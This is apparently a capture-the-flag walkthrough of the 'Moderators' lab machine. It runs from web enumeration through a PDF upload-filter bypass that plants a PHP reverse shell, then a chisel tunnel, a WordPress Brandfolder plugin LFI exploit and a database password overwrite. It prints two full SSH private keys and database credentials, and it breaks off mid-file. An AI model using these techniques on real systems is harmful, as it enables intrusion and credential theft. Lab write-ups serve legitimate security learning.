

### Tools: Feroxbuster, ffuf, python, chisel, vbox

### Vulnerabilities: PDF-PHP Reverse Shell, Wordpress LFI, SQL replace creds, VBOX cracking

Nmap reveals ssh and a webpage are open.

```console
└─$ nmap -A -p- -T4 -Pn 10.129.99.138     
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-07 11:29 CDT
Nmap scan report for 10.129.99.138
Host is up (0.067s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 39:03:16:06:11:30:a0:b0:c2:91:79:88:d3:93:1b:3e (RSA)
|   256 51:94:5c:59:3b:bd:bc:b6:26:7a:ef:83:7f:4c:ca:7d (ECDSA)
|_  256 a5:6d:03:fa:6c:f5:b9:4a:a2:a1:b6:bd:bc:60:42:31 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Moderators
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 674.55 seconds
zsh: segmentation fault  nmap -A -p- -T4 -Pn 10.129.99.138
```

Feroxbuster tells us this webpage has an uploads directory which means there is a possible vulnerabilty there as well an email page.

I checked the email page for a bit but did not find anything.

```console
└─$ feroxbuster -u http://10.129.99.138 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,git -q
200      GET      295l      683w        0c http://10.129.99.138/
403      GET        9l       28w      278c http://10.129.99.138/.php
403      GET        9l       28w      278c http://10.129.99.138/.html
301      GET        9l       28w      313c http://10.129.99.138/logs => http://10.129.99.138/logs/
200      GET      283l      990w        0c http://10.129.99.138/blog.php
301      GET        9l       28w      315c http://10.129.99.138/images => http://10.129.99.138/images/
200      GET      318l      612w        0c http://10.129.99.138/about.php
301      GET        9l       28w      312c http://10.129.99.138/css => http://10.129.99.138/css/
200      GET      267l      555w        0c http://10.129.99.138/contact.php
200      GET      295l      683w        0c http://10.129.99.138/index.php
302      GET      226l      417w     7888c http://10.129.99.138/reports.php => index.php
200      GET      249l      596w        0c http://10.129.99.138/service.php
301      GET        9l       28w      317c http://10.129.99.138/logs/css => http://10.129.99.138/logs/css/
301      GET        9l       28w      320c http://10.129.99.138/images/blog => http://10.129.99.138/images/blog/
301      GET        9l       28w      321c http://10.129.99.138/logs/uploads => http://10.129.99.138/logs/uploads/
200      GET        0l        0w        0c http://10.129.99.138/logs/index.html
200      GET        0l        0w        0c http://10.129.99.138/images/index.html
200      GET        0l        0w        0c http://10.129.99.138/css/index.html
403      GET        9l       28w      278c http://10.129.99.138/logs/.php
403      GET        9l       28w      278c http://10.129.99.138/logs/.html
200      GET        0l        0w        0c http://10.129.99.138/logs/uploads/index.html
200      GET        0l        0w        0c http://10.129.99.138/images/blog/index.html
200      GET        0l        0w        0c http://10.129.99.138/logs/css/index.html
403      GET        9l       28w      278c http://10.129.99.138/images/.php
403      GET        9l       28w      278c http://10.129.99.138/images/.html
403      GET        9l       28w      278c http://10.129.99.138/server-status
302      GET        0l        0w        0c http://10.129.99.138/send_mail.php => /contact.php?msg=Email sent
Scanning: http://10.129.99.138
Scanning: http://10.129.99.138/
Scanning: http://10.129.99.138/logs
Scanning: http://10.129.99.138/images
Scanning: http://10.129.99.138/css
Scanning: http://10.129.99.138/logs/css
Scanning: http://10.129.99.138/images/blog
Scanning: http://10.129.99.138/logs/uploads
```

However the blog section of the webpage seemed very interesting and it was actually hiding more reports than what was shown.

![image](https://user-images.githubusercontent.com/105310322/195454870-6cb78e65-7c11-4414-8c77-b1e2e38ed01d.png)


By fuzzing we can find the rest of the reports and take a look at them.


```console
└─$ ffuf -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt  -u http://10.129.99.138/reports.php?report=FUZZ -v -fs 0 -fw 3091 -fc 302 -c -s
2589
3478
4221
7612
8121
9798
```
By checking out http://Moderators.htb/reports.php?report=9798

Inside report 9798 we find a directory from the url that takes us to a page, However this page is blank.


```
 Report #9798

# Disclosure Information [+] Domain : bethebest101.uk.htb
[+] Vulnerability : Sensitive Information Disclosure
[+] Impact : 3.5/4.0
[+] Disclosed by : Karlos Young
[+] Disclosed on : 11/19/2021
[+] Posted on :
[+] Approved :
[+] Patched : NO
[+] LOGS : logs/e21cece511f43a5cb18d4932429915ed/
```

Running feroxbuster reveals that the there is a logs.pdf in the directory. This log was not important and only says "Logs removed"

```
└─$ feroxbuster -u http://10.129.99.138/logs/e21cece511f43a5cb18d4932429915ed -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,git,pdf -q
301      GET        9l       28w      346c http://10.129.99.138/logs/e21cece511f43a5cb18d4932429915ed => http://10.129.99.138/logs/e21cece511f43a5cb18d4932429915ed/
403      GET        9l       28w      278c http://10.129.99.138/logs/.php
403      GET        9l       28w      278c http://10.129.99.138/logs/.html
200      GET      219l      806w    10059c http://10.129.99.138/logs/e21cece511f43a5cb18d4932429915ed/logs.pdf
200      GET        0l        0w        0c http://10.129.99.138/logs/e21cece511f43a5cb18d4932429915ed/index.html
Scanning: http://10.129.99.138/logs/e21cece511f43a5cb18d4932429915ed
```

In fact each of these report numbers are actually the directory hashes. 

By taking the original log hash ```e21cece511f43a5cb18d4932429915ed``` and running a quick hash cracker we get back 9798. So if we take each of the these logs and convert them to an MD5 hash we can get the directories to check the other logs.pdf that each report holds.

Note: If you run feroxbuster on all of these it will show that each of them have logs.pdf files.

```
e21cece511f43a5cb18d4932429915ed=9798
743c41a921516b04afde48bb48e28ce6=2589
b071cfa81605a94ad80cfa2bbc747448=3478
b071cfa81605a94ad80cfa2bbc747448=4221
ce5d75028d92047a9ec617acb9c34ce6=7612
afecc60f82be41c1b52f6705ec69e0f1=8121
```

So by navigating to this pdf file it will give us some output and reveal a webpage that allows us to upload pdf files.

http://moderators.htb/logs/743c41a921516b04afde48bb48e28ce6/logs.pdf

```
Logs
[01/30/2021] Log file created for report #2589.
[01/30/2021] Report submitted by Sharaf Ahamed.
[02/03/2021] Report accepted.
[02/03/2021] LOG file uploaded from /logs/report_log_upload.php
[02/04/2021] Reported to the site administrators.
[02/05/2021] Posting approval sent to the owners.
[02/07/2021] Approval pending......
```

![image](https://user-images.githubusercontent.com/105310322/194651486-d61e8bfb-b8b7-4b94-a34a-09c5a2cd03c3.png)

However it only allows us to upload pdf files and we cannot get a reverse shell through a pdf.

So Wget one of the logs.pdf files and upload it from the page.

Then capture in burpsuite and edit out the pdf content with our own payload.

Note: Be sure to change the pdf file type to something like shell.pdf.php and to leave the %PDF-1.5 to bypass the filter.
Note2: Also be sure to rename the file if you fail since the files do not get overwritten or deleted.



![image](https://user-images.githubusercontent.com/105310322/194648359-03a0333b-00f3-467f-9306-0353c31b93fe.png)

Throwing the following PHP script in the pdf file will allow us to read the disabled functions in order to better assess we reverse shells we may use.

```
<?php
phpinfo();
```

![image](https://user-images.githubusercontent.com/105310322/194648168-1e62ad99-1e4f-4fe7-993b-7bdf3a2a6a34.png)



Using pentestmonkeys reverse php shell I was able to get in.

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

```console
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.16.19] from (UNKNOWN) [10.129.99.138] 38316
Linux moderators 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 20:43:51 up  4:16,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```
```console
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@moderators:/tmp$ 
```

Linpeas shows us that hiding in /opt/site.new is a wordpress webpage and that there is a something running on port 8080 which is likely our webpage.


```console
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                 
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                                                                             
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -  
```

```console
www-data@moderators:/tmp$ ls -la /opt/site.new
ls -la /opt/site.new
total 228
drwxr-xr-x  5 lexi moderators  4096 Jul 14 10:50 .
drwxr-xr-x  3 root root        4096 Jul 14 10:50 ..
-rw-r--r--  1 lexi moderators   405 Sep 11  2021 index.php
-rw-r--r--  1 lexi moderators 19915 Jan 29  2022 license.txt
-rw-r--r--  1 lexi moderators  7437 Jan 29  2022 readme.html
-rw-r--r--  1 lexi moderators  7165 Sep 11  2021 wp-activate.php
drwxr-xr-x  9 lexi moderators  4096 Jul 14 10:50 wp-admin
-rw-r--r--  1 lexi moderators   351 Sep 11  2021 wp-blog-header.php
-rw-r--r--  1 lexi moderators  2338 Jan 29  2022 wp-comments-post.php
-rw-r--r--  1 lexi moderators  3001 Jan 29  2022 wp-config-sample.php
-rw-r--r--  1 lexi moderators  3004 Sep 11  2021 wp-config-sample.php.bak
-rwxr-----  1 lexi moderators  3118 Sep 11  2021 wp-config.php
drwxr-xr-x  6 lexi moderators  4096 Jul 14 10:50 wp-content
-rw-r--r--  1 lexi moderators  3939 Sep 11  2021 wp-cron.php
drwxr-xr-x 26 lexi moderators 12288 Jul 14 10:50 wp-includes
-rw-r--r--  1 lexi moderators  2496 Sep 11  2021 wp-links-opml.php
-rw-r--r--  1 lexi moderators  3900 Sep 11  2021 wp-load.php
-rw-r--r--  1 lexi moderators 47916 Jan 29  2022 wp-login.php
-rw-r--r--  1 lexi moderators  8582 Jan 29  2022 wp-mail.php
-rw-r--r--  1 lexi moderators 23025 Jan 29  2022 wp-settings.php
-rw-r--r--  1 lexi moderators 31959 Jan 29  2022 wp-signup.php
-rw-r--r--  1 lexi moderators  4747 Sep 11  2021 wp-trackback.php
-rw-r--r--  1 lexi moderators  3236 Sep 11  2021 xmlrpc.php
```

Lets set up a quick chisel server and access this wordpress site.

```console
└─$ chisel server --reverse --port 1235
2022/10/07 16:35:37 server: Reverse tunnelling enabled
2022/10/07 16:35:37 server: Fingerprint CLzmvEC7zbiS5jQUtTW0/FEXtHqVQ0MPDH+tiHS3PJw=
2022/10/07 16:35:37 server: Listening on http://0.0.0.0:1235
2022/10/07 16:35:50 server: session#1: Client version (1.7.7) differs from server version (0.0.0-src)
2022/10/07 16:36:11 server: session#2: Client version (1.7.7) differs from server version (0.0.0-src)
2022/10/07 16:36:11 server: session#2: tun: proxy#R:8080=>localhost:8080: Listening
```

```console
www-data@moderators:/tmp$ ./chisel2 client 10.10.16.19:1235 R:8080:localhost:8080
<isel2 client 10.10.16.19:1235 R:8080:localhost:8080
2022/10/07 21:36:11 client: Connecting to ws://10.10.16.19:1235
2022/10/07 21:36:11 client: Connected (Latency 29.036943ms)
```

From /opt/site.new we can see all of the webpages on port 8080. Including a plugin called brandfolder.

Using the following exploits Proof of Concept we can get an idea on how to craft our exploit.

https://www.exploit-db.com/exploits/39591

Make a directory in the following place.

```console
www-data@moderators: mkdir -p /var/www/html/logs/uploads/wp/wp-admin/includes
```

Then add these files into the created directory with some php.


```console
www-data@moderators: echo '<?php ?>' > wp-admin/includes/media.php
www-data@moderators: echo '<?php ?>' > wp-admin/includes/file.php
www-data@moderators: echo '<?php ?>' > wp-admin/includes/image.php
www-data@moderators: echo '<?php ?>' > wp-admin/includes/post.php
```
Next copy our php shell and name it as wp-load.php and place it in  ```/var/www/html/logs/uploads/wp/```

```console
www-data@moderators: cp wp-load.php /var/www/html/logs/uploads/wp/
```

Finally navigate or curl the site

http://127.0.0.1:8080/wp-content/plugins/brandfolder/callback.php?wp_abspath=/var/www/html/logs/uploads/wp/

If everything goes well we receieve our shell and can cat the user flag!

```console
└─$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.10.16.19] from (UNKNOWN) [10.129.99.138] 33914
bash: cannot set terminal process group (859): Inappropriate ioctl for device
bash: no job control in this shell
lexi@moderators:/opt/site.new/wp-content/plugins/brandfolder$ cd 
cd 
lexi@moderators:~$ ls
ls
user.txt
lexi@moderators:~$ cat user.txt
cat user.txt
9f60****************************
```

Grab the SSH key for a better shell and a checkpoit :)

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
# John Privilege Escalation

linpeas quickly gives us our next step with creds to a sql database.

```console
╔══════════╣ Analyzing Wordpress Files (limit 70)
-rwxr----- 1 lexi moderators 3118 Sep 11  2021 /opt/site.new/wp-config.php                                                     
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpressuser' );
define( 'DB_PASSWORD', 'wordpresspassword123!!' );
define( 'DB_HOST', 'localhost' );
```
After logging in and locating the users and passwords we find some hashes.

```console
lexi@moderators:/tmp$ mysql -u wordpressuser -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 41
Server version: 10.3.34-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases
    -> ;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| wordpress          |
+--------------------+
2 rows in set (0.002 sec)

MariaDB [(none)]> use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [wordpress]> show tables
    -> ;
+----------------------------+
| Tables_in_wordpress        |
+----------------------------+
| wp_commentmeta             |
| wp_comments                |
| wp_links                   |
| wp_options                 |
| wp_pms_category            |
| wp_pms_passwords           |
| wp_postmeta                |
| wp_posts                   |
| wp_prflxtrflds_fields_meta |
| wp_term_relationships      |
| wp_term_taxonomy           |
| wp_termmeta                |
| wp_terms                   |
| wp_usermeta                |
| wp_users                   |
| wp_wpfm_backup             |
+----------------------------+
16 rows in set (0.001 sec)

MariaDB [wordpress]> select * from wp_users;
+----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email           | user_url                | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+--------------+
|  1 | admin      | $P$BXasOiM52pOUIRntJTPVlMoH0ZlntT0 | admin         | admin@moderators.htb | http://192.168.1.4:8080 | 2021-09-11 05:30:20 |                     |           0 | admin        |
|  2 | lexi       | $P$BZ0Fj92qgnvg4F52r3lpwHejcXag461 | lexi          | lexi@moderators.htb  |                         | 2021-09-12 16:51:16 |                     |           0 | lexi         |
+----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+--------------+
2 rows in set (0.001 sec)
```

These hashes are wordpress MD5 hashes. I tried cracking them but to no avail. The real way was simpler and just involved replacing them.


The link to hacktricks below gives a good example of how to set a new password.

https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql

Before that we need to create a new hashed password. The link below is a simple online generator.

https://www.useotools.com/wordpress-password-hash-generator

Now that we have our command and our hashed password we can set a new password.

Note: It's important that you change the tables and columns to match your database and not the default from hacktricks.

```console
MariaDB [wordpress]> UPDATE wp_users SET user_pass='$P$BL7sipqsbDoZ7yvWY9PxnY.OkXBVik/' WHERE user_login='admin';
Query OK, 1 row affected (0.007 sec)
Rows matched: 1  Changed: 1  Warnings: 0
```

Now that the password is changed we can finally access the wordpress site.

Note: Be sure to add moderators.htb to your hosts file for the IP 127.0.0.1

Navigate to http://moderators.htb/wp-login.php and login with the password you created.

![image](https://user-images.githubusercontent.com/105310322/195166895-12278582-196a-4555-9ee9-3d41e7f45499.png)

![image](https://user-images.githubusercontent.com/105310322/195166832-08ab62be-bf7c-4051-9717-f81fc3234d77.png)


Hiding in nearly plain site is the ssh key for John!

Also is super good friend Carl..


```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

```console
john@moderators:

```console
john@moderators:~/stuff/VBOX$ ls -la
total 118800
drwxr-xr-x 2 john john      4096 Jul 14 10:50 .
drwxr-xr-x 4 john john      4096 Jul 14 10:50 ..
-rwxr-xr-x 1 john john      5705 Sep 18  2020 2019-08-01.vbox
-rwxr-xr-x 1 john john 121634816 Sep 18  2020 2019.vdi
```

Change 2019-08-01.vbox too

```xml
<?xml version="1.0"?>
<!--
** DO NOT EDIT THIS FILE.
** If you make changes to this file while any VirtualBox related application
** is running, your changes will be overwritten later, without taking effect.
** Use VBoxManage or the VirtualBox Manager GUI to make changes.
-->
<VirtualBox xmlns="http://www.virtualbox.org/" version="1.16-linux">
  <Machine uuid="{528b3540-b8be-4677-b43f-7f4969137747}" name="Moderator 1" OSType="Ubuntu_64" snapshotFolder="Snapshots" lastStateChange="2022-10-12T21:04:10Z">
    <MediaRegistry>
      <HardDisks>
        <HardDisk uuid="{12b147da-5b2d-471f-9e32-a32b1517ff4b}" location="./2019.vdi" format="VDI" type="Normal"/>
      </HardDisks>
      <DVDImages>
        <Image uuid="{7653d755-c513-4004-8891-be83fc130dba}" location="/home/npayne/Downloads/10.129.204.224:8000/VBOX/F:/ubuntu-22.04-desktop-amd64.iso"/>
      </DVDImages>
    </MediaRegistry>
    <ExtraData>
      <ExtraDataItem name="GUI/LastCloseAction" value="PowerOff"/>
      <ExtraDataItem name="GUI/LastGuestSizeHint" value="2560,1335"/>
      <ExtraDataItem name="GUI/LastNormalWindowPosition" value="0,23,640,480,max"/>
    </ExtraData>
    <Hardware>
      <CPU count="2">
        <PAE enabled="false"/>
        <LongMode enabled="true"/>
        <X2APIC enabled="true"/>
        <HardwareVirtExLargePages enabled="true"/>
      </CPU>
      <Memory RAMSize="2048"/>
      <HID Pointing="USBTablet"/>
      <Boot>
        <Order position="1" device="Floppy"/>
        <Order position="2" device="HardDisk"/>
        <Order position="3" device="DVD"/>
        <Order position="4" device="None"/>
      </Boot>
      <Display controller="VMSVGA" VRAMSize="128" accelerate3D="true"/>
      <BIOS>
        <IOAPIC enabled="true"/>
        <SmbiosUuidLittleEndian enabled="true"/>
      </BIOS>
      <USB>
        <Controllers>
          <Controller name="OHCI" type="OHCI"/>
        </Controllers>
      </USB>
      <Network>
        <Adapter slot="0" enabled="true" MACAddress="08002799F7EC" type="82540EM">
          <NAT/>
        </Adapter>
      </Network>
      <AudioAdapter codec="AD1980" driver="Pulse" enabled="true" enabledIn="false"/>
      <RTC localOrUTC="UTC"/>
      <Clipboard/>
      <GuestProperties>
        <GuestProperty name="/VirtualBox/GuestAdd/HostVerLastChecked" value="6.1.34" timestamp="1657117437893678100" flags=""/>
        <GuestProperty name="/VirtualBox/GuestAdd/Revision" value="150636" timestamp="1657117380950198406" flags=""/>
        <GuestProperty name="/VirtualBox/GuestAdd/Version" value="6.1.34" timestamp="1657117380950198404" flags=""/>
        <GuestProperty name="/VirtualBox/GuestAdd/VersionExt" value="6.1.34" timestamp="1657117380950198405" flags=""/>
        <GuestProperty name="/VirtualBox/GuestInfo/Net/0/MAC" value="08002799F7EC" timestamp="1657117380952151105" flags=""/>
        <GuestProperty name="/VirtualBox/GuestInfo/Net/0/Name" value="enp0s3" timestamp="1657117380952151107" flags=""/>
        <GuestProperty name="/VirtualBox/GuestInfo/Net/0/Status" value="Up" timestamp="1657117380952151106" flags=""/>
        <GuestProperty name="/VirtualBox/GuestInfo/Net/0/V4/Broadcast" value="10.0.2.255" timestamp="1657117380952151103" flags=""/>
        <GuestProperty name="/VirtualBox/GuestInfo/Net/0/V4/IP" value="10.0.2.15" timestamp="1657117380952151102" flags=""/>
